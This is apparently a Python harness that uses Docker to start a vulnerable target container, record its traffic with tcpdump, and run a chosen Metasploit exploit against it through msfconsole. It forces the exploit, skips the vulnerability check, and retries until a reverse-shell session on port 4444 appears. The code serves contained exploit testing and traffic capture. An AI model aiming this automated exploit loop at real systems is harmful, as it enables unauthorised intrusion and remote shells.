import docker
import json
import time

class DockerMsfCli:
    def __init__(self, docker_client, name="target", 
                 network_name="set_framework_net", volume_name="set_logs", 
                 target_image="", msf_exploit=""):
        self.client=docker_client
        self.target=None
        self.attack=None
        self.tcpdump=None
        #these should be setup on init.  However, should they be cleaned first???
        self.network=network_name
        self.volume=volume_name
        self.name=name
        self.target_image=target_image
        self.msf_exploit=msf_exploit
        self.target_logs=None
        
    def network_setup(self):
        net = None
        networks = [i.name for i in self.client.networks.list()]
        if self.network in networks:
            net = self.client.networks.get(self.network)
        else:
            net = self.client.networks.create(self.network, driver="bridge")
        return net

    def volume_setup(self):
        vol = None
        vols = [i.name for i in self.client.volumes.list()]
        if self.volume in vols:
            vol = self.client.volumes.get(self.volume)
        else:
            vol = self.client.volumes.create(name=self.volume)
        return vol

    def target_setup(self):
        print("[*] Starting vulnerable target %s" % self.name)
        #tcpdump setup should happen automaticly after target setup
        dk_target = self.client.containers.run(self.target_image,
                                  detach=True, name=self.name,
                                  network=self.network)
        self.target=dk_target

    def target_cleanup(self):
        if self.tcpdump:
            self.tcpdump_cleanup()
        self.target.stop()
        self.target.remove()

    def tcpdump_setup(self):
        cmd = "-U -v -w /data/%s/pcap/%s.pcap" % (self.name, self.name) #I shortened this and removed the pcap dir
        dk_tcpdump = self.client.containers.run("tcpdump",command=cmd, detach=True,
                                  name="%s-tcpdump" % self.name, privileged=True,
                                  network="container:%s" % self.name, #TODO: this should be derived from self.target.name
                                  volumes={self.volume:{"bind":"/data","mode":'rw'}})
        self.tcpdump=dk_tcpdump

    def tcpdump_cleanup(self):
        self.tcpdump.stop()
        self.tcpdump.remove()

    def attack_setup(self):
        print("[*] Starting attack system for %s" % self.name)
        dk_attack = self.client.containers.run("metasploitframework/metasploit-framework:6.2.33",
                                 detach=True, name="%s-attack" % self.name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self):
        self.attack.stop()
        self.attack.remove()

    def setup_all(self):
        self.network_setup()
        self.volume_setup()
        self.target_setup()
        self.tcpdump_setup()
        self.attack_setup()

    def cleanup_all(self):
        self.target_cleanup()
        self.attack_cleanup()
    
    def exploit(self):
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        print("[*] Running exploit for %s" % self.name, end="", flush=True)
        args = args % (self.msf_exploit, "", self.name, "%s-attack" % self.name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self):
        #create check to see if exploit happened.
        #by default it checks for established connections on 4444
        #todo: create check customization for other MSF session ports
        
        cmd = "netstat |grep 4444 |grep ESTABLISHED"
        result = self.attack.exec_run(cmd=cmd, tty=True)
        cmd_result = str(result.output)
        print('.', end="", flush=True)
        for line in cmd_result.splitlines():
            if "4444" in str(line) and "ESTABLISHED" in str(line):
                print("\n[*] Exploit of %s success" % self.name)
                return True
        return False

    def exploit_until_success(self, status_delay=3, status_checks=10, tries=3):
        for i in range(tries):
            self.exploit()
            for i in range (status_checks):
                if self.exploit_success():
                    return True
                time.sleep(status_delay)
            print("\n[!] Exploit of %s failed or status unknown" % self.name)
        return False
    
    def ready_to_exploit(self):
        if self.target_logs == None:
            print("[*] Checking if target %s is setup" % self.name, end="",
                  flush=True)
        else:
            print('.', end="", flush=True)
        #temp solution
        logs = self.target.logs()
        if self.target_logs == logs:
            print("\n[*] Target %s is ready for exploit" % self.name)
            return True
        else:
            self.target_logs = logs
            time.sleep(5)
        return False
